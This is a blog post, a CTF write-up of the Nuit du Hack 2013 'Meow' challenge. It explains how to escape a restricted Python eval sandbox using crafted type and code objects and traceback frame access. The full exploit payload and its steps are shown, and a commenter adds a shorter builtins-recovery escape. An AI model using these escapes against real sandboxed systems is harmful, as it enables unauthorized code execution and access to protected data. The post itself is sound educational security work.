<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>delroth&#039;s blog &raquo; Escaping a Python sandbox (NdH 2013 quals writeup)</title>
<meta name="generator" content="WordPress 3.9" />
<link rel="stylesheet" href="http://blog.delroth.net/wp-content/themes/pyrmont-v2/style.css" type="text/css" media="screen" />
<link rel="shortcut icon" type="image/ico" href="http://blog.delroth.net/wp-content/themes/pyrmont-v2/images/favicon.ico" />
<link rel="alternate" type="application/rss+xml" title="delroth&#039;s blog RSS Feed" href="http://blog.delroth.net/feed/" />
<link rel="pingback" href="http://blog.delroth.net/xmlrpc.php" />
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js" type="text/javascript"></script>
<script src="http://blog.delroth.net/wp-content/themes/pyrmont-v2/scripts/basic.js" type="text/javascript"></script>
<link rel="alternate" type="application/rss+xml" title="delroth&#039;s blog &raquo; Escaping a Python sandbox (NdH 2013 quals writeup) Comments Feed" href="http://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/feed/" />
<link rel='stylesheet' id='openid-css'  href='http://blog.delroth.net/wp-content/plugins/openid/f/openid.css?ver=519' type='text/css' media='all' />
<link rel='stylesheet' id='wp-syntax-css-css'  href='http://blog.delroth.net/wp-content/plugins/wp-syntax/css/wp-syntax.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.delroth.net/wp-includes/js/jquery/jquery.js?ver=1.11.0'></script>
<script type='text/javascript' src='http://blog.delroth.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript' src='http://blog.delroth.net/wp-content/plugins/openid/f/openid.js?ver=519'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.delroth.net/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.delroth.net/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='GITS 2013 Writeup: MysteryBox (re300)' href='http://blog.delroth.net/2013/02/gits-2013-writeup-re300/' />
<link rel='next' title='Why Dolphin is getting rid of asynchronous audio processing' href='http://blog.delroth.net/2013/07/why-dolphin-is-getting-rid-of-asynchronous-audio-processing/' />
<meta name="generator" content="WordPress 3.9" />
<link rel='canonical' href='http://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/' />
<link rel='shortlink' href='http://blog.delroth.net/?p=452' />
	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<style type="text/css" id="syntaxhighlighteranchor"></style>
</head>

<body>

<div id="page_wrap">
	<div id="header">
		<div class="blog_title">
			<h1><a href="http://blog.delroth.net">delroth&#039;s blog</a></h1>
			<p class="description">My notes on reverse engineering, emulation and security related topics</p>
		</div>
		
		<div id="search">
	<form id="searchform" action="http://blog.delroth.net" method="get">
		<input type="text" id="searchinput" name="s" class="searchinput" value="search" onfocus="if (this.value == 'search') {this.value = '';}" onblur="if (this.value == '') {this.value = 'search';}" />
		<input type="submit" id="searchsubmit" class="button" value="" />
	</form>
</div>		
		<div class="clear"></div>
	</div><!-- end header -->
	
	<div id="main_navi">
		<ul class="left">
			<li><a href="http://blog.delroth.net">HOME<!--end--></a></li>
			    	</ul>
		
		<ul class="right">
			<!--<li class="twitter"><a href="http://twitter.com/your_user_name" title="Follow me on twitter">twitter</a></li>-->
			<li class="feed"><a href="http://blog.delroth.net/feed/" title="Subscribe delroth&#039;s blog"> rss feed</a></li>
		</ul>
	</div><!-- end main_navi -->
	<div class="clear"></div><div id="container">
	<div id="main">
    				<div class="post" id="post-452">
				<div class="date">
					2013<br />
					03.10				</div>
				<div class="title">
					<h2><a href="http://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/" rel="bookmark" title="Permalink to: Escaping a Python sandbox (NdH 2013 quals writeup)">Escaping a Python sandbox (NdH 2013 quals writeup)</a></h2>
					
					<div class="postmeta">
						Category:&nbsp;<span class="category"><a href="http://blog.delroth.net/category/ctf/" title="View all posts in CTF" rel="category tag">CTF</a>, <a href="http://blog.delroth.net/category/hacking/" title="View all posts in Hacking" rel="category tag">Hacking</a>, <a href="http://blog.delroth.net/category/python/" title="View all posts in Python" rel="category tag">Python</a></span>&nbsp;/
						Tags: no tag /						<span class="comments"><a href="#respond">Add Comment</a></span>
											</div><!-- end postmeta -->
				</div><!-- end title -->
				<div class="clear"></div>
				
				<div class="entry">
					<p>The Nuit du Hack CTF 2013 Quals round was taking place yesterday. As usual, I&#8217;ll be posting a few writeups about fun exercises and/or solutions from this CTF. If you want more, my teammate <a onclick="javascript:pageTracker._trackPageview('/outgoing/blog.w4kfu.com/');"  href="http://blog.w4kfu.com/">w4kfu</a> should be posting some writeups as well on his blog soon.</p>
<p><strong>TL;DR:</strong></p>
<pre><code>auth(''.__class__.__class__('haxx2',(),{'__getitem__':
lambda self,*a:'','__len__':(lambda l:l('function')( l('code')(
1,1,6,67,'d\x01\x00i\x00\x00i\x00\x00d\x02\x00d\x08\x00h\x02\x00'
'd\x03\x00\x84\x00\x00d\x04\x006d\x05\x00\x84\x00\x00d\x06\x006\x83'
'\x03\x00\x83\x00\x00\x04i\x01\x00\x02i\x02\x00\x83\x00\x00\x01z\n'
'\x00d\x07\x00\x82\x01\x00Wd\x00\x00QXd\x00\x00S',(None,'','haxx',
l('code')(1,1,1,83,'d\x00\x00S',(None,),('None',),('self',),'stdin',
'enter-lam',1,''),'__enter__',l('code')(1,2,3,87,'d\x00\x00\x84\x00'
'\x00d\x01\x00\x84\x00\x00\x83\x01\x00|\x01\x00d\x02\x00\x19i\x00'
'\x00i\x01\x00i\x01\x00i\x02\x00\x83\x01\x00S',(l('code')(1,1,14,83,
'|\x00\x00d\x00\x00\x83\x01\x00|\x00\x00d\x01\x00\x83\x01\x00d\x02'
'\x00d\x02\x00d\x02\x00d\x03\x00d\x04\x00d\n\x00d\x0b\x00d\x0c\x00d'
'\x06\x00d\x07\x00d\x02\x00d\x08\x00\x83\x0c\x00h\x00\x00\x83\x02'
'\x00S',('function','code',1,67,'|\x00\x00GHd\x00\x00S','s','stdin',
'f','',None,(None,),(),('s',)),('None',),('l',),'stdin','exit2-lam',
1,''),l('code')(1,3,4,83,'g\x00\x00\x04}\x01\x00d\x01\x00i\x00\x00i'
'\x01\x00d\x00\x00\x19i\x02\x00\x83\x00\x00D]!\x00}\x02\x00|\x02'
'\x00i\x03\x00|\x00\x00j\x02\x00o\x0b\x00\x01|\x01\x00|\x02\x00\x12'
'q\x1b\x00\x01q\x1b\x00~\x01\x00d\x00\x00\x19S',(0, ()),('__class__',
'__bases__','__subclasses__','__name__'),('n','_[1]','x'),'stdin',
'locator',1,''),2),('tb_frame','f_back','f_globals'),('self','a'),
'stdin','exit-lam',1,''),'__exit__',42,()),('__class__','__exit__',
'__enter__'),('self',),'stdin','f',1,''),{}))(lambda n:[x for x in
().__class__.__bases__[0].__subclasses__() if x.__name__ == n][0])})())</code>
</pre>
<p>One of the exercises, called &#8220;Meow&#8221;, gave us a remote restricted Python shell with most builtins disabled:</p>
<pre><code>{'int': &lt;type 'int'>, 'dir': &lt;built-in function dir>,
'repr': &lt;built-in function repr>, 'len': &lt;built-in function len>,
'help': &lt;function help at 0x2920488>}</code>
</pre>
<p>A few functions were available, namely <tt>kitty()</tt> displaying an ASCII cat, and <tt>auth(password)</tt>. I assumed our goal was to bypass the authentication or to find the password. Unfortunately, our Python commands are passed to <tt>eval</tt> in expression mode, which means we can&#8217;t use any Python statement: no assignment, no print, no function/class definitions, etc. This makes things a lot harder to work with. We&#8217;ll have to use some Python magic (this writeup will be full of it, I promise).</p>
<p>I first assumed <tt>auth</tt> was simply comparing the password to a constant string. In this case, I could use a custom object with <tt>__eq__</tt> overwritten to always return True. However, there is no trivial way to craft that object: we can&#8217;t define our own classes using the <tt>class Foo:</tt> syntax, we can&#8217;t modify an already existing object (no assignment), etc. This is where our first bit of Python magic comes into place: we can directly instantiate a <tt>type</tt> object to create a class object, then instantiate this class object. Here is how you would do it:</p>
<pre><code>type('MyClass', (), {'__eq__': lambda self: True})</code>
</pre>
<p>However, we can&#8217;t use <tt>type</tt> here: it is not defined in our builtins. We can use a second trick: every Python object has a <tt>__class__</tt> attribute, which gives us the type of an object. For example, <tt>''.__class__</tt> is <tt>str</tt>. But more interesting: <tt>str.__class__</tt> is <tt>type</tt>! Which means we can use <tt>''.__class__.__class__</tt> to instantiate our new type.</p>
<p>Unfortunately, the <tt>auth</tt> function is not simply comparing our object to a string. It&#8217;s doing a lot of other things to it: slicing it to 14 characters, taking its length via <tt>len()</tt> and calling <tt>reduce</tt> with a strange <tt>lambda</tt> as well. Without the code it&#8217;s going to be hard to guess how to make an object that behaves exactly like the function wants, and I don&#8217;t like guessing. We need more magic!</p>
<p>Enter code objects. Python functions are actually objects which are made of a code object and a capture of their global variables. A code object contains the bytecode of that function, as well as the constant objects it refers to, some strings and names, and other metadata (number of arguments, number of locals, stack size, mapping from bytecode to line number). You can get the code object of a function using <tt>myfunc.func_code</tt>. This is forbidden in the restricted mode of the Python interpreter, so we can&#8217;t see the code of the <tt>auth</tt> function. However, we can craft our own functions like we crafted our own types!</p>
<p>You might wonder: why do we need to use code objects to craft functions when we already have <tt>lambda</tt>? Simple: lambdas cannot contain statements. Random crafted functions can! For example, we can create a function that prints its argument to stdout:</p>
<pre><code>ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,),
                (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
# Outputs 42</code>
</pre>
<p>There is a slight problem with this though: to get the type of a code object, we need to access the <tt>func_code</tt> attribute, which is restricted. Fortunately, we can use even more Python magic to find our type without accessing forbidden attributes.</p>
<p>In Python, a type object has a <tt>__bases__</tt> attribute which returns the list of all its base classes. It also has a <tt>__subclasses__</tt> method that returns the list of all types that inherit from it. If we use <tt>__bases__</tt> on a random type, we can reach the top of the type hierarchy (<tt>object</tt> type), then read the subclasses of <tt>object</tt> to get a list of all types defined in the interpreter:</p>
<pre><code>>>> len(().__class__.__bases__[0].__subclasses__())
81</code>
</pre>
<p>We can then use this list to find our <tt>function</tt> and <tt>code</tt> types:</p>
<pre><code>>>> [x for x in ().__class__.__bases__[0].__subclasses__()
...  if x.__name__ == 'function'][0]
&lt;type 'function'>
>>> [x for x in ().__class__.__bases__[0].__subclasses__()
...  if x.__name__ == 'code'][0]
&lt;type 'code'></code>
</pre>
<p>Now that we can build any function we want, what can we do? We can&#8217;t directly access the non restricted builtins: the functions we craft are still executed in the restricted environment. We can get a non sandboxed function to call us: the <tt>auth</tt> function call the <tt>__len__</tt> method of the object that we pass as a parameter. This is however not enough to get out of the sandbox: our globals are still the same and we can&#8217;t for example import a module. I tried to look at all the classes we could access via the <tt>__subclasses__</tt> trick to see if we could get a reference to a useful module through there, but no dice. Even getting Twisted to call one of our crafted functions via the <tt>reactor</tt> was not enough. We could try to get a traceback object and use it to browse the stack frames of our callers, but the only trivial ways to get a traceback object are via the <tt>inspect</tt> or the <tt>sys</tt> modules which we can&#8217;t import. After being blocked on that problem, I went to work on other problems, slept a lot, and woke up to the solution I needed!</p>
<p>There actually is another way to get a traceback object in Python without using the standard library: context managers. They are a new feature of Python 2.6 which allow some kind of object life scoping in Python:</p>
<pre><code>class CtxMan:
    def __enter__(self):
        print 'Enter'
    def __exit__(self, exc_type, exc_val, exc_tb):
        print 'Exit:', exc_type, exc_val, exc_tb

with CtxMan():
    print 'Inside'
    error

# Output:
# Enter
# Inside
# Exit: &lt;type 'exceptions.NameError'> name 'error' is not defined
        &lt;traceback object at 0x7f1a46ac66c8></code>
</pre>
<p>We can create a context manager object which will use the traceback object passed to <tt>__exit__</tt> to display the global variables of our caller, caller which is out of the restricted environment. To do that, we use a combination of all our previous tricks. We create an anonymous type defining <tt>__enter__</tt> as a simple lambda and <tt>__exit__</tt> as a lambda that accesses what we want in the traceback and passes it to our <tt>print</tt> lambda (remember, we can&#8217;t use statements):</p>
<pre><code>''.__class__.__class__('haxx', (),
  {'__enter__': lambda self: None,
   '__exit__': lambda self, *a:
     (lambda l: l('function')(l('code')(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S',
                                        (None,), (), ('s',), 'stdin', 'f',
                                        1, ''), {})
     )(lambda n: [x for x in ().__class__.__bases__[0].__subclasses__()
                    if x.__name__ == n][0])
     (a[2].tb_frame.f_back.f_back.f_globals)})()</code>
</pre>
<p>We need to go deeper! Now, we need to use this context manager (that we will call <tt>ctx</tt> in our next code snippets) in a function that will purposefully raise an error in a <tt>with</tt> block:</p>
<pre><code>def f(self):
    with ctx:
        raise 42</code>
</pre>
<p>And we put <tt>f</tt> as the <tt>__len__</tt> of our crafted object that we pass to the <tt>auth</tt> function:</p>
<pre><code>auth(''.__class__.__class__('haxx2', (), {
  '__getitem__': lambda *a: '',
  '__len__': f
})())</code>
</pre>
<p>Refer to the beginning of the article for the &#8220;real&#8221; inlined code. When ran on the server, this causes the Python interpreter to run our <tt>f</tt> function, go through the crafted context manager <tt>__exit__</tt>, which will access the globals from our caller, which contain these two interesting values:</p>
<pre><code>'FLAG2': 'ICanHazUrFl4g', 'FLAG1': 'Int3rnEt1sm4de0fc47'</code>
</pre>
<p>Two flags?! Turns out that the same service was used for two successive exercises. Double kill!</p>
<p>For more fun, by accessing the globals we can do more than simply reading: we can also modify the flags! Using <tt>f_globals.update({ 'FLAG1': 'lol', 'FLAG2': 'nope' })</tt> the flags are changed until the next server restart. This was apparently not planned by the organizers.</p>
<p>Anyway, I still don&#8217;t know how we were supposed to solve this challenge normally, but I think this &#8220;generic&#8221; solution is a good way to introduce people to some nice Python black magic <img src="http://blog.delroth.net/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" />  Use it carefully, it&#8217;s easy to get Python to segfault using crafted code objects (exploiting the Python interpreter and running an x86 shellcode via crafted Python bytecode will be left as an exercise for the reader). Thanks to the Nuit du Hack organizers for this nice exercise.</p>
					<div class="clear"></div>
				</div><!-- end entry -->
			</div><!-- end post -->
		
		
<!-- You can start editing here. -->

<div id="comments">
	<h3>5 comments so far</h3>
	<span class="add_your_comment"><a href="#respond">Add Your Comment</a></span>
	<div class="clear"></div>
</div>


<ol class="commentlist">
		<li class="comment even thread-even depth-1" id="li-comment-291">
		<div id="comment-291">
			<div class="comment-author vcard">
				<div class="left">
					<img alt='' src='http://1.gravatar.com/avatar/fbcd3f115ce33ea2380f5a2dae0cf6d2?s=48&amp;d=http%3A%2F%2F1.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D48&amp;r=G' class='avatar avatar-48 photo' height='48' width='48' />					<div class="reply">
						<a class='comment-reply-link' href='/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/?replytocom=291#respond' onclick='return addComment.moveForm("comment-291", "291", "respond", "452")'>Reply</a>					</div>
				</div>
			</div><!-- end vcard -->
		
			<div class="right">
								
				<div class="comment-meta commentmetadata">
					Mikko Ohtamaa&nbsp;said:&nbsp;2013.03.11&nbsp;01:15				</div>
			
				<p>I just came across your blog and the articles are freaking insightful. And I thought I know a lot about Python and sandboxing <img src="http://blog.delroth.net/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" />  keep up the good work.</p>
			</div>
			<div class="clear"></div>
		</div>
</li><!-- #comment-## -->
	<li class="comment odd alt thread-odd thread-alt depth-1" id="li-comment-294">
		<div id="comment-294">
			<div class="comment-author vcard">
				<div class="left">
					<img alt='' src='http://1.gravatar.com/avatar/d3b1a158e65d313915cc48623049193e?s=48&amp;d=http%3A%2F%2F1.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D48&amp;r=G' class='avatar avatar-48 photo' height='48' width='48' />					<div class="reply">
						<a class='comment-reply-link' href='/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/?replytocom=294#respond' onclick='return addComment.moveForm("comment-294", "294", "respond", "452")'>Reply</a>					</div>
				</div>
			</div><!-- end vcard -->
		
			<div class="right">
								
				<div class="comment-meta commentmetadata">
					<a onclick="javascript:pageTracker._trackPageview('/outgoing/users.livejournal.com/_winnie/');"  href='http://users.livejournal.com/_winnie/' rel='external nofollow' class='url'>Ivan Dobrokotov</a>&nbsp;said:&nbsp;2013.03.12&nbsp;03:41				</div>
			
				<p>Great mind-bender, thanks!</p>
<p>Tryed to run this code ( <a onclick="javascript:pageTracker._trackPageview('/outgoing/pastebin.com/SpXZLpRB');"  href="http://pastebin.com/SpXZLpRB" rel="nofollow">http://pastebin.com/SpXZLpRB</a> ), got error:</p>
<p>Traceback (most recent call last):<br />
  File &#8220;x.py&#8221;, line 42, in<br />
    (lambda n:[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == n][0]<br />
  File &#8220;x.py&#8221;, line 6, in auth<br />
    print len(x)<br />
  File &#8220;stdin&#8221;, line 1, in f<br />
SystemError: /home/jt/rel/python-2.7.3-1/python-2.7.3-1/src/Python-2.7.3/Objects/dictobject.c:755: bad argument to internal function</p>
			</div>
			<div class="clear"></div>
		</div>
</li><!-- #comment-## -->
	<li class="comment byuser comment-author-delroth bypostauthor even thread-even depth-1" id="li-comment-296">
		<div id="comment-296">
			<div class="comment-author vcard">
				<div class="left">
					<img alt='' src='http://0.gravatar.com/avatar/a7c333ee5d59519be7b757f917a950ba?s=48&amp;d=http%3A%2F%2F0.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D48&amp;r=G' class='avatar avatar-48 photo' height='48' width='48' />					<div class="reply">
						<a class='comment-reply-link' href='/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/?replytocom=296#respond' onclick='return addComment.moveForm("comment-296", "296", "respond", "452")'>Reply</a>					</div>
				</div>
			</div><!-- end vcard -->
		
			<div class="right">
								
				<div class="comment-meta commentmetadata">
					delroth&nbsp;said:&nbsp;2013.03.12&nbsp;08:08				</div>
			
				<p>The code is for Python 2.6. There are a few minor differences with Python 2.7 when creating the code objects but the same principles apply.</p>
			</div>
			<div class="clear"></div>
		</div>
</li><!-- #comment-## -->
	<li class="comment odd alt thread-odd thread-alt depth-1" id="li-comment-297">
		<div id="comment-297">
			<div class="comment-author vcard">
				<div class="left">
					<img alt='' src='http://1.gravatar.com/avatar/909940e0aa9d738ef2595fe226527094?s=48&amp;d=http%3A%2F%2F1.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D48&amp;r=G' class='avatar avatar-48 photo' height='48' width='48' />					<div class="reply">
						<a class='comment-reply-link' href='/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/?replytocom=297#respond' onclick='return addComment.moveForm("comment-297", "297", "respond", "452")'>Reply</a>					</div>
				</div>
			</div><!-- end vcard -->
		
			<div class="right">
								
				<div class="comment-meta commentmetadata">
					BitK&nbsp;said:&nbsp;2013.03.12&nbsp;12:34				</div>
			
				<p>TL;DR</p>
<p>__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)<br />
import sys; print open(sys.argv[0]).read()</p>
<p> <img src="http://blog.delroth.net/wp-includes/images/smilies/icon_biggrin.gif" alt=":D" class="wp-smiley" /> </p>
			</div>
			<div class="clear"></div>
		</div>
</li><!-- #comment-## -->
	<li class="comment even thread-even depth-1" id="li-comment-784">
		<div id="comment-784">
			<div class="comment-author vcard">
				<div class="left">
					<img alt='' src='http://1.gravatar.com/avatar/94b29f677149554aa36e3939750670f0?s=48&amp;d=http%3A%2F%2F1.gravatar.com%2Favatar%2Fad516503a11cd5ca435acc9bb6523536%3Fs%3D48&amp;r=G' class='avatar avatar-48 photo' height='48' width='48' />					<div class="reply">
						<a class='comment-reply-link' href='/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/?replytocom=784#respond' onclick='return addComment.moveForm("comment-784", "784", "respond", "452")'>Reply</a>					</div>
				</div>
			</div><!-- end vcard -->
		
			<div class="right">
								
				<div class="comment-meta commentmetadata">
					<a onclick="javascript:pageTracker._trackPageview('/outgoing/blog.ztrix.me');"  href='http://blog.ztrix.me' rel='external nofollow' class='url'>zTrix</a>&nbsp;said:&nbsp;2014.04.15&nbsp;13:35				</div>
			
				<p>very Impressive!</p>
<p>A small question, how to construct the long exploit code at the beginning of this article? Is there some compile stuff or sth else to help?</p>
			</div>
			<div class="clear"></div>
		</div>
</li><!-- #comment-## -->
</ol>

<!--paged comment goes here-->
<div class="comments_navi">
	<div class="alignleft"></div>
	<div class="alignright"></div>
	<div class="clear"></div>
</div>




<div id="respond">

<div class="h3_cancel_reply">
	<h3>Your Comment</h3>
	<span class="cancel-comment-reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/#respond" style="display:none;">Change mind? Click here to cancel.</a></span>
	<div class="clear"></div>
</div>


<form action="http://blog.delroth.net/wp-comments-post.php" method="post" id="commentform">


<div class="input_area"><textarea name="comment" id="comment" cols="60" rows="5" tabindex="1" class="message_input" onkeydown="if((event.ctrlKey&&event.keyCode==13)){document.getElementById('submit').click();return false};" ></textarea></div>
	
<div class="user_info">
	<div class="single_field">
		<label for="author" class="desc">Name<abbr title="Required">*</abbr> :</label>
		<input type="text" name="author" id="author" value="" size="22" tabindex="2" class="comment_input" aria-required='true' />
	</div>
	
	<div class="single_field">
		<label for="email" class="desc">Email<abbr title="Required, would not be published">*</abbr> :</label>
		<input type="text" name="email" id="email" value="" size="22" tabindex="3" class="comment_input" aria-required='true' />
	</div>

	<div class="single_field">
		<label for="url" class="desc">URI :</label>
		<input type="text" name="url" id="url" value="" size="22" tabindex="4" class="comment_input" />
	</div>
	<div class="clear"></div>
</div>


<!--<p><small><strong>XHTML:</strong> You can use these tags: <code>&lt;a href=&quot;&quot; title=&quot;&quot;&gt; &lt;abbr title=&quot;&quot;&gt; &lt;acronym title=&quot;&quot;&gt; &lt;b&gt; &lt;blockquote cite=&quot;&quot;&gt; &lt;cite&gt; &lt;code&gt; &lt;del datetime=&quot;&quot;&gt; &lt;em&gt; &lt;i&gt; &lt;q cite=&quot;&quot;&gt; &lt;strike&gt; &lt;strong&gt; </code></small></p>-->

<div class="submit_button">
	<input name="submit" type="submit" id="submit" tabindex="5" value="Submit" class="button" />
	<input type='hidden' name='comment_post_ID' value='452' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
	
<div id="captchaImgDiv">

<div class="captchaSizeDivLarge"><img id="si_image_com" class="si-captcha" src="http://blog.delroth.net/wp-content/plugins/si-captcha-for-wordpress/captcha/securimage_show.php?si_form_id=com&amp;prefix=0ObZTLE6G74U8adB" width="175" height="60" alt="CAPTCHA Image" title="CAPTCHA Image" />
    <input id="si_code_com" name="si_code_com" type="hidden"  value="0ObZTLE6G74U8adB" />
    <div id="si_refresh_com">
<a href="#" rel="nofollow" title="Refresh Image" onclick="si_captcha_refresh('si_image_com','com','/wp-content/plugins/si-captcha-for-wordpress/captcha','http://blog.delroth.net/wp-content/plugins/si-captcha-for-wordpress/captcha/securimage_show.php?si_form_id=com&amp;prefix='); return false;">
      <img class="captchaImgRefresh" src="http://blog.delroth.net/wp-content/plugins/si-captcha-for-wordpress/captcha/images/refresh.png" width="22" height="20" alt="Refresh Image" onclick="this.blur();" /></a>
  </div>
  </div>
<div id="captchaInputDiv"><input id="captcha_code" name="captcha_code" type="text" value="" tabindex="4"  />
 <label id="captcha_code_label" for="captcha_code">CAPTCHA Code</label><span class="required"> *</span>
 </div>
</div>
<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="ea465fe41a" /></p>		<span id="openid_comment">
			<label>
				<input type="checkbox" id="login_with_openid" name="login_with_openid" checked="checked" />
				Authenticate this comment using <span class="openid_link">OpenID</span>.			</label>
		</span>
		<script type="text/javascript">jQuery(function(){ add_openid_to_comment_form('http://blog.delroth.net/index.php', '73ab827faf') })</script>
	<div class="clear"></div>
</div>

</form>

</div>

				
		 
	</div><!-- end main --> 
<div id="sidebar">
	
	<ul>
		<li id="linkcat-2" class="widget widget_links"><h2 class="widgettitle">Links</h2>

	<ul class='xoxo blogroll'>
<li><a href="http://delroth.net/" rel="me" title="About Me">About Me</a></li>
<li><a href="http://twitter.com/delroth_" rel="me">Twitter (@delroth_)</a></li>

	</ul>
</li>

		<li id="recent-posts-3" class="widget widget_recent_entries">		<h2 class="widgettitle">Recent Posts</h2>
		<ul>
					<li>
				<a href="http://blog.delroth.net/2014/03/boston-key-party-crackme300-hypercube-writeup/">Boston Key Party crackme300 &#8220;hypercube&#8221; writeup</a>
						</li>
					<li>
				<a href="http://blog.delroth.net/2014/02/wii-u-bootrom-dumped-what-it-means-in-practice/">Wii U Bootrom &#8220;dumped&#8221; &#8211; what it means in practice</a>
						</li>
					<li>
				<a href="http://blog.delroth.net/2013/07/why-dolphin-is-getting-rid-of-asynchronous-audio-processing/">Why Dolphin is getting rid of asynchronous audio processing</a>
						</li>
					<li>
				<a href="http://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/">Escaping a Python sandbox (NdH 2013 quals writeup)</a>
						</li>
					<li>
				<a href="http://blog.delroth.net/2013/02/gits-2013-writeup-re300/">GITS 2013 Writeup: MysteryBox (re300)</a>
						</li>
				</ul>
		</li>
<li id="categories-3" class="widget widget_categories"><h2 class="widgettitle">Categories</h2>
		<ul>
	<li class="cat-item cat-item-14"><a href="http://blog.delroth.net/category/ctf/" title="View all posts filed under CTF">CTF</a> (4)
</li>
	<li class="cat-item cat-item-3"><a href="http://blog.delroth.net/category/dmms/" title="View all posts filed under DMMS">DMMS</a> (3)
</li>
	<li class="cat-item cat-item-15"><a href="http://blog.delroth.net/category/dolphin/" title="View all posts filed under Dolphin">Dolphin</a> (1)
</li>
	<li class="cat-item cat-item-13"><a href="http://blog.delroth.net/category/epita/" title="View all posts filed under EPITA">EPITA</a> (1)
</li>
	<li class="cat-item cat-item-11"><a href="http://blog.delroth.net/category/hacking/" title="View all posts filed under Hacking">Hacking</a> (15)
</li>
	<li class="cat-item cat-item-7"><a href="http://blog.delroth.net/category/jeux/" title="View all posts filed under Jeux">Jeux</a> (5)
</li>
	<li class="cat-item cat-item-1"><a href="http://blog.delroth.net/category/non-classe/" title="View all posts filed under Non classé">Non classé</a> (2)
</li>
	<li class="cat-item cat-item-6"><a href="http://blog.delroth.net/category/notes/" title="View all posts filed under Notes">Notes</a> (13)
</li>
	<li class="cat-item cat-item-5"><a href="http://blog.delroth.net/category/python/" title="View all posts filed under Python">Python</a> (5)
</li>
	<li class="cat-item cat-item-8"><a href="http://blog.delroth.net/category/review/" title="View all posts filed under Review">Review</a> (1)
</li>
	<li class="cat-item cat-item-12"><a href="http://blog.delroth.net/category/systeme/" title="View all posts filed under Système">Système</a> (3)
</li>
	<li class="cat-item cat-item-9"><a href="http://blog.delroth.net/category/wii/" title="View all posts filed under Wii">Wii</a> (11)
</li>
	<li class="cat-item cat-item-4"><a href="http://blog.delroth.net/category/windows/" title="View all posts filed under Windows">Windows</a> (1)
</li>
		</ul>
</li>
<li id="recent-comments-3" class="widget widget_recent_comments"><h2 class="widgettitle">Recent Comments</h2>
<ul id="recentcomments"><li class="recentcomments">Seriousjoe on <a href="http://blog.delroth.net/2010/12/eternal-sonata-sur-ps3-ma-review-totalement-subjective/#comment-787">Eternal Sonata sur PS3 : ma review totalement subjective</a></li><li class="recentcomments">Phillip on <a href="http://blog.delroth.net/2013/07/why-dolphin-is-getting-rid-of-asynchronous-audio-processing/#comment-786">Why Dolphin is getting rid of asynchronous audio processing</a></li><li class="recentcomments"><a onclick="javascript:pageTracker._trackPageview('/outgoing/blog.ztrix.me');"  href='http://blog.ztrix.me' rel='external nofollow' class='url'>zTrix</a> on <a href="http://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/#comment-784">Escaping a Python sandbox (NdH 2013 quals writeup)</a></li><li class="recentcomments"><a href='http://blog.delroth.net/2014/03/boston-key-party-crackme300-hypercube-writeup/' rel='external nofollow' class='url'>delroth&#039;s blog &raquo; Boston Key Party crackme300 &#8220;hypercube&#8221; writeup</a> on <a href="http://blog.delroth.net/2012/03/gcwii-dol-plugin-built-for-ida-6-1/#comment-758">GC/Wii DOL Plugin built for IDA 6.1</a></li><li class="recentcomments"><a onclick="javascript:pageTracker._trackPageview('/outgoing/www.revogamers.net/comunidad/wii-u-66/tabernilla-wii-u-bienvenidos-donde-se-21476/index1572.html#post616716');"  href='http://www.revogamers.net/comunidad/wii-u-66/tabernilla-wii-u-bienvenidos-donde-se-21476/index1572.html#post616716' rel='external nofollow' class='url'>Anonymous</a> on <a href="http://blog.delroth.net/2014/02/wii-u-bootrom-dumped-what-it-means-in-practice/#comment-756">Wii U Bootrom &#8220;dumped&#8221; &#8211; what it means in practice</a></li></ul></li>
<li id="archives-3" class="widget widget_archive"><h2 class="widgettitle">Archives</h2>
		<ul>
	<li><a href='http://blog.delroth.net/2014/03/'>March 2014</a></li>
	<li><a href='http://blog.delroth.net/2014/02/'>February 2014</a></li>
	<li><a href='http://blog.delroth.net/2013/07/'>July 2013</a></li>
	<li><a href='http://blog.delroth.net/2013/03/'>March 2013</a></li>
	<li><a href='http://blog.delroth.net/2013/02/'>February 2013</a></li>
	<li><a href='http://blog.delroth.net/2012/10/'>October 2012</a></li>
